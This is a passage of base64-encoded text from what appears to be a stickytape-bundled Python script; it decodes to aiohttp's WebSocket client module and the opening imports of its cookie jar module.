NvZGUpICsgbWVzc2FnZSwgb3Bjb2RlPVdTTXNnVHlwZS5DTE9TRVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZmluYWxseTpcclxuICAgICAgICAgICAgc2VsZi5fY2xvc2luZyA9IFRydWVcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvY2xpZW50X3dzLnB5JywgYiciIiJXZWJTb2NrZXQgY2xpZW50IGZvciBhc3luY2lvLiIiIlxyXG5cclxuaW1wb3J0IGFzeW5jaW9cclxuZnJvbSB0eXBpbmcgaW1wb3J0IEFueSwgT3B0aW9uYWwsIGNhc3RcclxuXHJcbmltcG9ydCBhc3luY190aW1lb3V0XHJcblxyXG5mcm9tIC5jbGllbnRfZXhjZXB0aW9ucyBpbXBvcnQgQ2xpZW50RXJyb3JcclxuZnJvbSAuY2xpZW50X3JlcXJlcCBpbXBvcnQgQ2xpZW50UmVzcG9uc2VcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgY2FsbF9sYXRlciwgc2V0X3Jlc3VsdFxyXG5mcm9tIC5odHRwIGltcG9ydCAoXHJcbiAgICBXU19DTE9TRURfTUVTU0FHRSxcclxuICAgIFdTX0NMT1NJTkdfTUVTU0FHRSxcclxuICAgIFdlYlNvY2tldEVycm9yLFxyXG4gICAgV1NDbG9zZUNvZGUsXHJcbiAgICBXU01lc3NhZ2UsXHJcbiAgICBXU01zZ1R5cGUsXHJcbilcclxuZnJvbSAuaHR0cF93ZWJzb2NrZXQgaW1wb3J0IFdlYlNvY2tldFdyaXRlciAgIyBXU01lc3NhZ2VcclxuZnJvbSAuc3RyZWFtcyBpbXBvcnQgRW9mU3RyZWFtLCBGbG93Q29udHJvbERhdGFRdWV1ZVxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgKFxyXG4gICAgREVGQVVMVF9KU09OX0RFQ09ERVIsXHJcbiAgICBERUZBVUxUX0pTT05fRU5DT0RFUixcclxuICAgIEpTT05EZWNvZGVyLFxyXG4gICAgSlNPTkVuY29kZXIsXHJcbilcclxuXHJcblxyXG5jbGFzcyBDbGllbnRXZWJTb2NrZXRSZXNwb25zZTpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIHJlYWRlcjogIkZsb3dDb250cm9sRGF0YVF1ZXVlW1dTTWVzc2FnZV0iLFxyXG4gICAgICAgIHdyaXRlcjogV2ViU29ja2V0V3JpdGVyLFxyXG4gICAgICAgIHByb3RvY29sOiBPcHRpb25hbFtzdHJdLFxyXG4gICAgICAgIHJlc3BvbnNlOiBDbGllbnRSZXNwb25zZSxcclxuICAgICAgICB0aW1lb3V0OiBmbG9hdCxcclxuICAgICAgICBhdXRvY2xvc2U6IGJvb2wsXHJcbiAgICAgICAgYXV0b3Bpbmc6IGJvb2wsXHJcbiAgICAgICAgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCxcclxuICAgICAgICAqLFxyXG4gICAgICAgIHJlY2VpdmVfdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSxcclxuICAgICAgICBoZWFydGJlYXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUsXHJcbiAgICAgICAgY29tcHJlc3M6IGludCA9IDAsXHJcbiAgICAgICAgY2xpZW50X25vdGFrZW92ZXI6IGJvb2wgPSBGYWxzZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9yZXNwb25zZSA9IHJlc3BvbnNlXHJcbiAgICAgICAgc2VsZi5fY29ubiA9IHJlc3BvbnNlLmNvbm5lY3Rpb25cclxuXHJcbiAgICAgICAgc2VsZi5fd3JpdGVyID0gd3JpdGVyXHJcbiAgICAgICAgc2VsZi5fcmVhZGVyID0gcmVhZGVyXHJcbiAgICAgICAgc2VsZi5fcHJvdG9jb2wgPSBwcm90b2NvbFxyXG4gICAgICAgIHNlbGYuX2Nsb3NlZCA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fY2xvc2luZyA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbaW50XVxyXG4gICAgICAgIHNlbGYuX3RpbWVvdXQgPSB0aW1lb3V0XHJcbiAgICAgICAgc2VsZi5fcmVjZWl2ZV90aW1lb3V0ID0gcmVjZWl2ZV90aW1lb3V0XHJcbiAgICAgICAgc2VsZi5fYXV0b2Nsb3NlID0gYXV0b2Nsb3NlXHJcbiAgICAgICAgc2VsZi5fYXV0b3BpbmcgPSBhdXRvcGluZ1xyXG4gICAgICAgIHNlbGYuX2hlYXJ0YmVhdCA9IGhlYXJ0YmVhdFxyXG4gICAgICAgIHNlbGYuX2hlYXJ0YmVhdF9jYjogT3B0aW9uYWxbYXN5bmNpby5UaW1lckhhbmRsZV0gPSBOb25lXHJcbiAgICAgICAgaWYgaGVhcnRiZWF0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9wb25nX2hlYXJ0YmVhdCA9IGhlYXJ0YmVhdCAvIDIuMFxyXG4gICAgICAgIHNlbGYuX3BvbmdfcmVzcG9uc2VfY2I6IE9wdGlvbmFsW2FzeW5jaW8uVGltZXJIYW5kbGVdID0gTm9uZVxyXG4gICAgICAgIHNlbGYuX2xvb3AgPSBsb29wXHJcbiAgICAgICAgc2VsZi5fd2FpdGluZyA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYXN5bmNpby5GdXR1cmVbYm9vbF1dXHJcbiAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXVxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzID0gY29tcHJlc3NcclxuICAgICAgICBzZWxmLl9jbGllbnRfbm90YWtlb3ZlciA9IGNsaWVudF9ub3Rha2VvdmVyXHJcblxyXG4gICAgICAgIHNlbGYuX3Jlc2V0X2hlYXJ0YmVhdCgpXHJcblxyXG4gICAgZGVmIF9jYW5jZWxfaGVhcnRiZWF0KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fcG9uZ19yZXNwb25zZV9jYiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fcG9uZ19yZXNwb25zZV9jYi5jYW5jZWwoKVxyXG4gICAgICAgICAgICBzZWxmLl9wb25nX3Jlc3BvbnNlX2NiID0gTm9uZVxyXG5cclxuICAgICAgICBpZiBzZWxmLl9oZWFydGJlYXRfY2IgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2hlYXJ0YmVhdF9jYi5jYW5jZWwoKVxyXG4gICAgICAgICAgICBzZWxmLl9oZWFydGJlYXRfY2IgPSBOb25lXHJcblxyXG4gICAgZGVmIF9yZXNldF9oZWFydGJlYXQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9jYW5jZWxfaGVhcnRiZWF0KClcclxuXHJcbiAgICAgICAgaWYgc2VsZi5faGVhcnRiZWF0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFydGJlYXRfY2IgPSBjYWxsX2xhdGVyKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fc2VuZF9oZWFydGJlYXQsIHNlbGYuX2hlYXJ0YmVhdCwgc2VsZi5fbG9vcFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9zZW5kX2hlYXJ0YmVhdChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX2hlYXJ0YmVhdCBpcyBub3QgTm9uZSBhbmQgbm90IHNlbGYuX2Nsb3NlZDpcclxuICAgICAgICAgICAgIyBmaXJlLWFuZC1mb3JnZXQgYSB0YXNrIGlzIG5vdCBwZXJmZWN0IGJ1dCBtYXliZSBvayBmb3JcclxuICAgICAgICAgICAgIyBzZW5kaW5nIHBpbmcuIE90aGVyd2lzZSB3ZSBuZWVkIGEgbG9uZy1saXZpbmcgaGVhcnRiZWF0XHJcbiAgICAgICAgICAgICMgdGFzayBpbiB0aGUgY2xhc3MuXHJcbiAgICAgICAgICAgIHNlbGYuX2xvb3AuY3JlYXRlX3Rhc2soc2VsZi5fd3JpdGVyLnBpbmcoKSlcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3BvbmdfcmVzcG9uc2VfY2IgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9wb25nX3Jlc3BvbnNlX2NiLmNhbmNlbCgpXHJcbiAgICAgICAgICAgIHNlbGYuX3BvbmdfcmVzcG9uc2VfY2IgPSBjYWxsX2xhdGVyKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fcG9uZ19ub3RfcmVjZWl2ZWQsIHNlbGYuX3BvbmdfaGVhcnRiZWF0LCBzZWxmLl9sb29wXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBkZWYgX3Bvbmdfbm90X3JlY2VpdmVkKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IHNlbGYuX2Nsb3NlZDpcclxuICAgICAgICAgICAgc2VsZi5fY2xvc2VkID0gVHJ1ZVxyXG4gICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gV1NDbG9zZUNvZGUuQUJOT1JNQUxfQ0xPU1VSRVxyXG4gICAgICAgICAgICBzZWxmLl9leGNlcHRpb24gPSBhc3luY2lvLlRpbWVvdXRFcnJvcigpXHJcbiAgICAgICAgICAgIHNlbGYuX3Jlc3BvbnNlLmNsb3NlKClcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjbG9zZWQoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY2xvc2VkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2xvc2VfY29kZShzZWxmKSAtPiBPcHRpb25hbFtpbnRdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jbG9zZV9jb2RlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcHJvdG9jb2woc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcHJvdG9jb2xcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBjb21wcmVzcyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2NvbXByZXNzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2xpZW50X25vdGFrZW92ZXIoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY2xpZW50X25vdGFrZW92ZXJcclxuXHJcbiAgICBkZWYgZ2V0X2V4dHJhX2luZm8oc2VsZiwgbmFtZTogc3RyLCBkZWZhdWx0OiBBbnkgPSBOb25lKSAtPiBBbnk6XHJcbiAgICAgICAgIiIiZXh0cmEgaW5mbyBmcm9tIGNvbm5lY3Rpb24gdHJhbnNwb3J0IiIiXHJcbiAgICAgICAgY29ubiA9IHNlbGYuX3Jlc3BvbnNlLmNvbm5lY3Rpb25cclxuICAgICAgICBpZiBjb25uIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBkZWZhdWx0XHJcbiAgICAgICAgdHJhbnNwb3J0ID0gY29ubi50cmFuc3BvcnRcclxuICAgICAgICBpZiB0cmFuc3BvcnQgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuIGRlZmF1bHRcclxuICAgICAgICByZXR1cm4gdHJhbnNwb3J0LmdldF9leHRyYV9pbmZvKG5hbWUsIGRlZmF1bHQpXHJcblxyXG4gICAgZGVmIGV4Y2VwdGlvbihzZWxmKSAtPiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZXhjZXB0aW9uXHJcblxyXG4gICAgYXN5bmMgZGVmIHBpbmcoc2VsZiwgbWVzc2FnZTogYnl0ZXMgPSBiIiIpIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgc2VsZi5fd3JpdGVyLnBpbmcobWVzc2FnZSlcclxuXHJcbiAgICBhc3luYyBkZWYgcG9uZyhzZWxmLCBtZXNzYWdlOiBieXRlcyA9IGIiIikgLT4gTm9uZTpcclxuICAgICAgICBhd2FpdCBzZWxmLl93cml0ZXIucG9uZyhtZXNzYWdlKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZW5kX3N0cihzZWxmLCBkYXRhOiBzdHIsIGNvbXByZXNzOiBPcHRpb25hbFtpbnRdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShkYXRhLCBzdHIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImRhdGEgYXJndW1lbnQgbXVzdCBiZSBzdHIgKCVyKSIgJSB0eXBlKGRhdGEpKVxyXG4gICAgICAgIGF3YWl0IHNlbGYuX3dyaXRlci5zZW5kKGRhdGEsIGJpbmFyeT1GYWxzZSwgY29tcHJlc3M9Y29tcHJlc3MpXHJcblxyXG4gICAgYXN5bmMgZGVmIHNlbmRfYnl0ZXMoc2VsZiwgZGF0YTogYnl0ZXMsIGNvbXByZXNzOiBPcHRpb25hbFtpbnRdID0gTm9uZSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShkYXRhLCAoYnl0ZXMsIGJ5dGVhcnJheSwgbWVtb3J5dmlldykpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImRhdGEgYXJndW1lbnQgbXVzdCBiZSBieXRlLWlzaCAoJXIpIiAlIHR5cGUoZGF0YSkpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fd3JpdGVyLnNlbmQoZGF0YSwgYmluYXJ5PVRydWUsIGNvbXByZXNzPWNvbXByZXNzKVxyXG5cclxuICAgIGFzeW5jIGRlZiBzZW5kX2pzb24oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBkYXRhOiBBbnksXHJcbiAgICAgICAgY29tcHJlc3M6IE9wdGlvbmFsW2ludF0gPSBOb25lLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgZHVtcHM6IEpTT05FbmNvZGVyID0gREVGQVVMVF9KU09OX0VOQ09ERVIsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgYXdhaXQgc2VsZi5zZW5kX3N0cihkdW1wcyhkYXRhKSwgY29tcHJlc3M9Y29tcHJlc3MpXHJcblxyXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYsICosIGNvZGU6IGludCA9IFdTQ2xvc2VDb2RlLk9LLCBtZXNzYWdlOiBieXRlcyA9IGIiIikgLT4gYm9vbDpcclxuICAgICAgICAjIHdlIG5lZWQgdG8gYnJlYWsgYHJlY2VpdmUoKWAgY3ljbGUgZmlyc3QsXHJcbiAgICAgICAgIyBgY2xvc2UoKWAgbWF5IGJlIGNhbGxlZCBmcm9tIGRpZmZlcmVudCB0YXNrXHJcbiAgICAgICAgaWYgc2VsZi5fd2FpdGluZyBpcyBub3QgTm9uZSBhbmQgbm90IHNlbGYuX2Nsb3NlZDpcclxuICAgICAgICAgICAgc2VsZi5fcmVhZGVyLmZlZWRfZGF0YShXU19DTE9TSU5HX01FU1NBR0UsIDApXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dhaXRpbmdcclxuXHJcbiAgICAgICAgaWYgbm90IHNlbGYuX2Nsb3NlZDpcclxuICAgICAgICAgICAgc2VsZi5fY2FuY2VsX2hlYXJ0YmVhdCgpXHJcbiAgICAgICAgICAgIHNlbGYuX2Nsb3NlZCA9IFRydWVcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5fd3JpdGVyLmNsb3NlKGNvZGUsIG1lc3NhZ2UpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBhc3luY2lvLkNhbmNlbGxlZEVycm9yOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgIHNlbGYuX3Jlc3BvbnNlLmNsb3NlKClcclxuICAgICAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgIHNlbGYuX2V4Y2VwdGlvbiA9IGV4Y1xyXG4gICAgICAgICAgICAgICAgc2VsZi5fcmVzcG9uc2UuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2Nsb3Npbmc6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9yZXNwb25zZS5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG5cclxuICAgICAgICAgICAgd2hpbGUgVHJ1ZTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGFzeW5jX3RpbWVvdXQudGltZW91dChzZWxmLl90aW1lb3V0KTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbXNnID0gYXdhaXQgc2VsZi5fcmVhZGVyLnJlYWQoKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IGFzeW5jaW8uQ2FuY2VsbGVkRXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9yZXNwb25zZS5jbG9zZSgpXHJcbiAgICAgICAgICAgICAgICAgICAgcmFpc2VcclxuICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBXU0Nsb3NlQ29kZS5BQk5PUk1BTF9DTE9TVVJFXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gZXhjXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcmVzcG9uc2UuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbXNnLnR5cGUgPT0gV1NNc2dUeXBlLkNMT1NFOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NlX2NvZGUgPSBtc2cuZGF0YVxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3Jlc3BvbnNlLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBGYWxzZVxyXG5cclxuICAgIGFzeW5jIGRlZiByZWNlaXZlKHNlbGYsIHRpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUpIC0+IFdTTWVzc2FnZTpcclxuICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICBpZiBzZWxmLl93YWl0aW5nIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJDb25jdXJyZW50IGNhbGwgdG8gcmVjZWl2ZSgpIGlzIG5vdCBhbGxvd2VkIilcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2Nsb3NlZDpcclxuICAgICAgICAgICAgICAgIHJldHVybiBXU19DTE9TRURfTUVTU0FHRVxyXG4gICAgICAgICAgICBlbGlmIHNlbGYuX2Nsb3Npbmc6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNsb3NlKClcclxuICAgICAgICAgICAgICAgIHJldHVybiBXU19DTE9TRURfTUVTU0FHRVxyXG5cclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fd2FpdGluZyA9IHNlbGYuX2xvb3AuY3JlYXRlX2Z1dHVyZSgpXHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhc3luY190aW1lb3V0LnRpbWVvdXQodGltZW91dCBvciBzZWxmLl9yZWNlaXZlX3RpbWVvdXQpOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtc2cgPSBhd2FpdCBzZWxmLl9yZWFkZXIucmVhZCgpXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcmVzZXRfaGVhcnRiZWF0KClcclxuICAgICAgICAgICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgICAgICAgICAgd2FpdGVyID0gc2VsZi5fd2FpdGluZ1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3dhaXRpbmcgPSBOb25lXHJcbiAgICAgICAgICAgICAgICAgICAgc2V0X3Jlc3VsdCh3YWl0ZXIsIFRydWUpXHJcbiAgICAgICAgICAgIGV4Y2VwdCAoYXN5bmNpby5DYW5jZWxsZWRFcnJvciwgYXN5bmNpby5UaW1lb3V0RXJyb3IpOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgIHJhaXNlXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFb2ZTdHJlYW06XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gV1NDbG9zZUNvZGUuT0tcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFdTTWVzc2FnZShXU01zZ1R5cGUuQ0xPU0VELCBOb25lLCBOb25lKVxyXG4gICAgICAgICAgICBleGNlcHQgQ2xpZW50RXJyb3I6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZWQgPSBUcnVlXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gV1NDbG9zZUNvZGUuQUJOT1JNQUxfQ0xPU1VSRVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFdTX0NMT1NFRF9NRVNTQUdFXHJcbiAgICAgICAgICAgIGV4Y2VwdCBXZWJTb2NrZXRFcnJvciBhcyBleGM6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gZXhjLmNvZGVcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY2xvc2UoY29kZT1leGMuY29kZSlcclxuICAgICAgICAgICAgICAgIHJldHVybiBXU01lc3NhZ2UoV1NNc2dUeXBlLkVSUk9SLCBleGMsIE5vbmUpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXhjOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gZXhjXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zaW5nID0gVHJ1ZVxyXG4gICAgICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY2xvc2UoKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFdTTWVzc2FnZShXU01zZ1R5cGUuRVJST1IsIGV4YywgTm9uZSlcclxuXHJcbiAgICAgICAgICAgIGlmIG1zZy50eXBlID09IFdTTXNnVHlwZS5DTE9TRTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NpbmcgPSBUcnVlXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gbXNnLmRhdGFcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLl9jbG9zZWQgYW5kIHNlbGYuX2F1dG9jbG9zZTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNsb3NlKClcclxuICAgICAgICAgICAgZWxpZiBtc2cudHlwZSA9PSBXU01zZ1R5cGUuQ0xPU0lORzpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2Nsb3NpbmcgPSBUcnVlXHJcbiAgICAgICAgICAgIGVsaWYgbXNnLnR5cGUgPT0gV1NNc2dUeXBlLlBJTkcgYW5kIHNlbGYuX2F1dG9waW5nOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5wb25nKG1zZy5kYXRhKVxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgZWxpZiBtc2cudHlwZSA9PSBXU01zZ1R5cGUuUE9ORyBhbmQgc2VsZi5fYXV0b3Bpbmc6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICAgICAgcmV0dXJuIG1zZ1xyXG5cclxuICAgIGFzeW5jIGRlZiByZWNlaXZlX3N0cihzZWxmLCAqLCB0aW1lb3V0OiBPcHRpb25hbFtmbG9hdF0gPSBOb25lKSAtPiBzdHI6XHJcbiAgICAgICAgbXNnID0gYXdhaXQgc2VsZi5yZWNlaXZlKHRpbWVvdXQpXHJcbiAgICAgICAgaWYgbXNnLnR5cGUgIT0gV1NNc2dUeXBlLlRFWFQ6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihmIlJlY2VpdmVkIG1lc3NhZ2Uge21zZy50eXBlfTp7bXNnLmRhdGEhcn0gaXMgbm90IHN0ciIpXHJcbiAgICAgICAgcmV0dXJuIGNhc3Qoc3RyLCBtc2cuZGF0YSlcclxuXHJcbiAgICBhc3luYyBkZWYgcmVjZWl2ZV9ieXRlcyhzZWxmLCAqLCB0aW1lb3V0OiBPcHRpb25hbFtmbG9hdF0gPSBOb25lKSAtPiBieXRlczpcclxuICAgICAgICBtc2cgPSBhd2FpdCBzZWxmLnJlY2VpdmUodGltZW91dClcclxuICAgICAgICBpZiBtc2cudHlwZSAhPSBXU01zZ1R5cGUuQklOQVJZOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoZiJSZWNlaXZlZCBtZXNzYWdlIHttc2cudHlwZX06e21zZy5kYXRhIXJ9IGlzIG5vdCBieXRlcyIpXHJcbiAgICAgICAgcmV0dXJuIGNhc3QoYnl0ZXMsIG1zZy5kYXRhKVxyXG5cclxuICAgIGFzeW5jIGRlZiByZWNlaXZlX2pzb24oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICAqLFxyXG4gICAgICAgIGxvYWRzOiBKU09ORGVjb2RlciA9IERFRkFVTFRfSlNPTl9ERUNPREVSLFxyXG4gICAgICAgIHRpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUsXHJcbiAgICApIC0+IEFueTpcclxuICAgICAgICBkYXRhID0gYXdhaXQgc2VsZi5yZWNlaXZlX3N0cih0aW1lb3V0PXRpbWVvdXQpXHJcbiAgICAgICAgcmV0dXJuIGxvYWRzKGRhdGEpXHJcblxyXG4gICAgZGVmIF9fYWl0ZXJfXyhzZWxmKSAtPiAiQ2xpZW50V2ViU29ja2V0UmVzcG9uc2UiOlxyXG4gICAgICAgIHJldHVybiBzZWxmXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYW5leHRfXyhzZWxmKSAtPiBXU01lc3NhZ2U6XHJcbiAgICAgICAgbXNnID0gYXdhaXQgc2VsZi5yZWNlaXZlKClcclxuICAgICAgICBpZiBtc2cudHlwZSBpbiAoV1NNc2dUeXBlLkNMT1NFLCBXU01zZ1R5cGUuQ0xPU0lORywgV1NNc2dUeXBlLkNMT1NFRCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFN0b3BBc3luY0l0ZXJhdGlvblxyXG4gICAgICAgIHJldHVybiBtc2dcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvY29va2llamFyLnB5JywgYidpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgY29udGV4dGxpYlxyXG5pbXBvcnQgZGF0ZXRpbWVcclxuaW1wb3J0IG9zICAjIG5vcWFcclxuaW1wb3J0IHBhdGhsaWJcclxuaW1wb3J0IHBpY2tsZVxyXG5pbXBvcnQgcmVcclxuZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgZGVmYXVsdGRpY3RcclxuZnJvbSBodHRwLmNvb2tpZXMgaW1wb3J0IEJhc2VDb29raWUsIE1vcnNlbCwgU2ltcGxlQ29va2llXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoICAjIG5vcWFcclxuICAgIERlZmF1bHREaWN0LFxyXG4gICAgRGljdCxcclxuICAgIEl0ZXJhYmxlLFxyXG4gICAgSXRlcmF0b3IsXHJcbiAgICBMaXN0LFxyXG4gICAgTWFwcGluZyxcclxuICAgIE9wdGlvbmFsLFxyXG4gICAgU2V0LFxyXG4gICAgVHVwbGUsXHJcbiAgICBVbmlvbixcclxuICAgIGNhc3QsXHJcbilcclxuXHJcbmZyb20geWFybCBpbXBvcnQgVVJMXHJcblxyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0Q29va2llSmFyLCBDbGVhckNvb2tpZVB